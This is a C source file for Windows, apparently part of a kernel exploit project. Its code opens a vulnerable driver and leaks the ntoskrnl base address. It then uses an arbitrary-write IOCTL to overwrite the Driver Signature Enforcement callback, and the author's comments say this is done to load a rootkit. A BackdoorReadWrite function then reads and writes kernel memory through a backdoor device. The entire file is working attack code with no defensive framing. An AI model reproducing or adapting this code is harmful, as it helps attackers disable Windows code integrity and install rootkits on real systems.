#include <Windows.h>

#include "Exploit.h"
#include "Leak.h"

MIMKRNL_INPUT_BUFFER g_InputBuffer = { 0 };
MIMKRNL_WRITE_INFO g_WriteInfo = { 0 };

// Original exploit written by myself, repurposed to disable DSE and load a root-kit.
// No, there's no CVE for it sadly (but I did request one manually a month or two ago now).
char DisableDSE(void)
{
	HANDLE hDevice = INVALID_HANDLE_VALUE;
	unsigned long long NTBase = 0;
	unsigned long long OverwriteAddress = 0;
	unsigned long long ReplacementFunction = 0;
	HANDLE hThread = 0;

	memset(&g_InputBuffer, 0, sizeof(g_InputBuffer));
	memset(&g_WriteInfo, 0, sizeof(g_WriteInfo));

	//
	// Initialization
	//
	hDevice = CreateFileA(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, 0);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		return 1;
	}

	g_WriteInfo.MustBe3Or14 = 3;
	g_InputBuffer.MustBeGreaterThan0 = 1;
	g_InputBuffer.MustBeNonZero = 1;
	g_InputBuffer.pWriteInfo = &g_WriteInfo;

	//
	// Leak
	//
	NTBase = GetBaseAddress("ntoskrnl.exe");
	if (!NTBase)
	{
		return 1;
	}

	OverwriteAddress = GetDSEOverwriteAddress(NTBase);
	if (!OverwriteAddress)
	{
		return 1;
	}

	ReplacementFunction = GetFunctionAddress(NTBase, "ntoskrnl.exe", "ZwFlushInstructionCache");
	if (!ReplacementFunction)
	{
		return 1;
	}

	//
	// Exploitation
	//

	g_WriteInfo.pWriteAddress = (void*)(OverwriteAddress);
	g_InputBuffer.WriteData = ReplacementFunction;
	g_InputBuffer.WriteCount = 8;

	hThread = CreateThread(0, 0, PerformWrite, hDevice, 0, 0);
	if (!hThread)
	{
		return 1;
	}

	// You can't kill the thread right away, otherwise the write won't go through.
	// So, we wait a little bit prior to doing so.
	Sleep(200);
	CloseHandle(hThread);

	//
	// Cleanup
	//

	// The overwritten Code Integrity callback will be restored once the kernel R/W capability is established (the driver will hook a function to overwrite).
	// Therefore, there is nothing left to clean-up besides this handle for now.
	CloseHandle(hDevice);

	return 0;
}

// Must be multi-threaded due to the driver hanging the thread the arbitrary write is launched on.
// Otherwise, you would have to relaunch the program, and that's really annoying.
unsigned long PerformWrite(HANDLE hDevice)
{
	HANDLE hEvent = 0;

	unsigned long BytesReturned = 0;
	OVERLAPPED IoInfo = { 0 };

	memset(&IoInfo, 0, sizeof(IoInfo));

	hEvent = CreateEventA(0, 1, 0, 0);
	if (!hEvent)
	{
		return 1;
	}
	IoInfo.hEvent = hEvent;

	DeviceIoControl(hDevice, TARGET_IOCTL, &g_InputBuffer, sizeof(g_InputBuffer), 0, 0, &BytesReturned, &IoInfo);

	CloseHandle(hEvent);

	return 0;
}

char BackdoorReadWrite(void* Destination, void* Source, unsigned long long Size)
{
	HANDLE hDevice = INVALID_HANDLE_VALUE;

	RW_INPUT_BUFFER RWBuffer = { 0 };
	unsigned long BytesReturned = 0;

	memset(&RWBuffer, 0, sizeof(RWBuffer));

	hDevice = CreateFileA(BACKDOOR_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		return 1;
	}

	RWBuffer.Dst = (unsigned long long)Destination;
	RWBuffer.Src = (unsigned long long)Source;
	RWBuffer.Size = Size;

	DeviceIoControl(hDevice, BACKDOOR_IOCTL, &RWBuffer, sizeof(RWBuffer), 0, 0, &BytesReturned, 0);

	CloseHandle(hDevice);

	return 0;
}